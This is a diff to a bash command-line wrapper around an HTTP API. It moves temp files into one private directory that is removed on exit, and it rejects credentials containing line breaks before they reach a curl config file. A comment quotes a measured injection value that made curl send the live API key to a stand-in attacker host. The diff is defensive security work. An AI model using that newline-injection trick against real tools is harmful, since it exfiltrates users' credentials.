@@ -79,17 +79,51 @@ have()  { command -v "$1" >/dev/null 2>&1; }
 # _need_val FLAG [VALUE …] — die clearly instead of a silent `shift 2` death.
 _need_val() { [ "$#" -ge 2 ] || die "flag $1 needs a value" "$EX_USAGE"; }
 
-# ── temp-file safety net (T4) ─────────────────────────────────────────
-# Every tmp file (the 0600 auth-header config, response buffers, the --all
-# accumulator) is registered here and swept on ANY exit — including Ctrl-C
-# mid-request, which previously left a file with the live API key in $TMPDIR.
-UKU_TMPFILES=""
-_mktemp()  { local f; f="$(mktemp)" || die "cannot create a temp file" "$EX_USAGE"; UKU_TMPFILES="$UKU_TMPFILES $f"; printf '%s' "$f"; }
-# _rmtmp FILE… — delete now AND forget, so a long-running loop (a --batch of
-# 500 lines = 2000 request buffers) doesn't hold every response of the run on
-# disk until the process exits. The EXIT trap stays the backstop for the rest.
-_rmtmp()   { local f; for f in "$@"; do [ -n "$f" ] || continue; rm -f "$f" 2>/dev/null || true; UKU_TMPFILES="${UKU_TMPFILES// $f/}"; done; return 0; }
-_cleanup() { [ -n "$UKU_TMPFILES" ] && rm -f $UKU_TMPFILES 2>/dev/null; return 0; }
+# ── temp-file safety net ──────────────────────────────────────────────
+# Every temp file this run makes — the 0600 auth-header config, the response
+# and header buffers, the request body, the --all accumulator, the batch input
+# — lives inside ONE private directory, and the exit/signal traps remove that
+# directory. One path in, one path out.
+#
+# It used to be an accumulator: _mktemp appended to UKU_TMPFILES and _cleanup
+# ran `rm -f $UKU_TMPFILES`. It never deleted a single file. Every call site
+# was `tmp="$(_mktemp)"`, and a command substitution is a SUBSHELL, so the
+# append happened to a copy and the parent's variable stayed empty — the
+# EXIT/INT/TERM/HUP traps were decorative, and the happy path was clean only
+# because do_request calls _rmtmp explicitly. Measured 2026-07-29: a network
+# error left `header = "X-API-Key: uku_live_…"` behind (0600, in $TMPDIR), and
+# a --dry-run — the thing an agent runs before every write — left the key
+# config AND the request body with the client's data in it. macOS clears
+# /var/folders only on reboot, so those files sat there for days.
+#
+# Hence the shape below: _mktemp is a SETTER, never `$(…)`. A setter cannot be
+# defeated by a subshell, and it is what lets the run directory be created in
+# the shell the trap actually runs in. It also retires the unquoted
+# `rm -f $UKU_TMPFILES`, which would have split a path on a space in $TMPDIR.
+UKU_RUNDIR=""
+_rundir() {
+  [ -n "$UKU_RUNDIR" ] && return 0
+  local d="${TMPDIR:-/tmp}"; d="${d%/}"
+  # An explicit template, not a bare `mktemp -d`: macOS's mktemp ignores
+  # $TMPDIR and always uses /var/folders, so a bare call would put the key
+  # config somewhere the caller never named and no test could see.
+  UKU_RUNDIR="$(mktemp -d "$d/uku.XXXXXXXX")" || die "cannot create a temp directory in $d" "$EX_USAGE"
+  chmod 700 "$UKU_RUNDIR" 2>/dev/null || true
+  return 0
+}
+# _mktemp VAR — create a temp file in this run's directory and put its path in
+# VAR. Call it as `_mktemp tmp`, never as `tmp="$(_mktemp)"`.
+_mktemp() {
+  _rundir
+  local __t
+  __t="$(mktemp "$UKU_RUNDIR/f.XXXXXX")" || die "cannot create a temp file" "$EX_USAGE"
+  printf -v "$1" '%s' "$__t"
+}
+# _rmtmp FILE… — delete now, so a long-running loop (a --batch of 500 lines =
+# 2000 request buffers) doesn't hold every response of the run on disk until
+# the process exits. The traps stay the backstop for the rest.
+_rmtmp()   { local f; for f in "$@"; do [ -n "$f" ] || continue; rm -f "$f" 2>/dev/null || true; done; return 0; }
+_cleanup() { [ -n "$UKU_RUNDIR" ] && rm -rf "$UKU_RUNDIR" 2>/dev/null; return 0; }
 # A signal trap whose handler RETURNS resumes the script where it was
 # interrupted — so `trap _cleanup INT` quietly made Ctrl-C a no-op: uku swept
 # its temp files and carried straight on. Measured 2026-07-28: SIGINT during a
@@ -196,6 +230,13 @@ load_creds() {
 save_profile() {
   local name="$1" base="$2" company="$3" key="$4"
   _valid_name "$name" || die "Invalid account name: '$name' (use letters, digits, . _ -)" "$EX_USAGE"
+  # A profile file is line-based too, so the same break that injects a curl
+  # directive also injects a bogus UKU_KEY= line here. Checked at the point of
+  # writing, not at the point of reading, so no such value ever reaches disk —
+  # including via `--key-stdin < a-file-with-a-newline-in-the-middle`.
+  _check_cred_line "the base URL" "$base"
+  _check_cred_line "the company id" "$company"
+  _check_cred_line "the API key" "$key"
   mkdir -p "$UKU_PROFILE_DIR"; chmod 700 "$UKU_CONFIG_HOME" "$UKU_PROFILE_DIR" 2>/dev/null || true
   local f; f="$(_profile_path "$name")"
   ( umask 077
@@ -248,6 +289,27 @@ REPLY_METHOD=""  # and its METHOD, because a 5xx remedy is not the same
 # curl -K config values live inside "…"; backslash-escape \ and " so a key or
 # company containing them can't silently corrupt the header (T12).
 _cfg_esc() { local s="$1"; s="${s//\\/\\\\}"; s="${s//\"/\\\"}"; printf '%s' "$s"; }
+# …but no amount of escaping reaches across a LINE BREAK: the -K grammar is
+# line-based, so a newline inside a credential ends the header directive and
+# starts a new one. Measured 2026-07-29 with
+# UKU_API_KEY=$'sekret-key\nurl = http://attacker/exfil': curl performed a
+# SECOND transfer to the attacker's host carrying the live X-API-Key, and the
+# user saw nothing. --header values have been checked for this since T12
+# (_check_header_arg); the credentials themselves were not. The env path and a
+# --key-stdin file are both easy carriers — _trim only strips the ENDS, so a
+# newline in the middle of a key file survives. A profile file happens to be
+# safe (_profile_get greps one line), but that is luck, not design.
+#
+# Two call sites, deliberately: before the -K file is written (every path that
+# sends), and in save_profile (so such a value never reaches disk at all).
+# No remedy slug — there is no command that fixes a broken credential, and an
+# invented one would be worse than silence.
+_check_cred_line() { # LABEL VALUE
+  case "$2" in
+    *$'\n'*|*$'\r'*)
+      die "$1 must be a single line — a line break in it would inject a directive into the curl config the credentials are passed through. Nothing was sent or stored." "$EX_USAGE" ;;
+  esac
+}
 
 # _reply_header NAME — the trimmed value of one response header.
 # Names are case-insensitive per RFC 9110 (HTTP/2 sends them lowercased, so
@@ -439,9 +501,13 @@ do_request() {
   local url="$UKU_BASE$path"
   REPLY_PATH="$path"
   REPLY_METHOD="$method"
+  # Before anything is created or sent: the two values that go into the -K
+  # config verbatim must each be one line (see _check_cred_line).
+  _check_cred_line "the company id (UKU_COMPANY)" "$UKU_COMPANY"
+  _check_cred_line "the API key (UKU_API_KEY)" "$UKU_KEY"
   _guard_time_entry "$method" "$path" "$data"
   case "$method" in GET|HEAD) : ;; *) _pace_write ;; esac
-  local tmp cfg hdrf; tmp="$(_mktemp)"; cfg="$(_mktemp)"; hdrf="$(_mktemp)"
+  local tmp cfg hdrf; _mktemp tmp; _mktemp cfg; _mktemp hdrf
   chmod 600 "$cfg" "$hdrf" 2>/dev/null || true
   # Auth headers go through a 0600 curl config file (-K), never argv — so the
   # API key can't be read from `ps` on a multi-user host. --header values get the
@@ -468,7 +534,7 @@ do_request() {
   # once, and never on an HTTP status.
   # Request body also goes to a 0600 file, off argv — invoice/client PII isn't in `ps` either (#2).
   if [ -n "$data" ]; then
-    local body; body="$(_mktemp)"; chmod 600 "$body" 2>/dev/null || true
+    local body; _mktemp body; chmod 600 "$body" 2>/dev/null || true
     printf '%s' "$data" > "$body"
     args+=(-H "Content-Type: application/json" --data-binary @"$body")
   fi
@@ -1825,7 +1891,7 @@ _list_all() {
     case "$kv" in limit=*|offset=*) : ;; *) filters+=("$kv") ;; esac
   done
   local offset=0 page=200 total=0 more=1
-  local acc; acc="$(_mktemp)"
+  local acc; _mktemp acc
   while [ "$more" = "1" ]; do
     do_request GET "$path$(build_query limit=$page offset=$offset ${filters[@]+"${filters[@]}"})"
     check_status "$REPLY_BODY"
@@ -2086,7 +2152,7 @@ run_batch() {
   # stdin and eats the rest of the file. The loop below reads from a dedicated
   # fd 3 so curl's stdin and the input can never be the same descriptor.
   local src="$UKU_BATCH" f
-  f="$(_mktemp)"; chmod 600 "$f" 2>/dev/null || true
+  _mktemp f; chmod 600 "$f" 2>/dev/null || true
   case "$src" in
     @-) cat > "$f" ;;
     @*) [ -f "${src#@}" ] || die "batch file not found: ${src#@}" "$EX_USAGE"; cat "${src#@}" > "$f" ;;
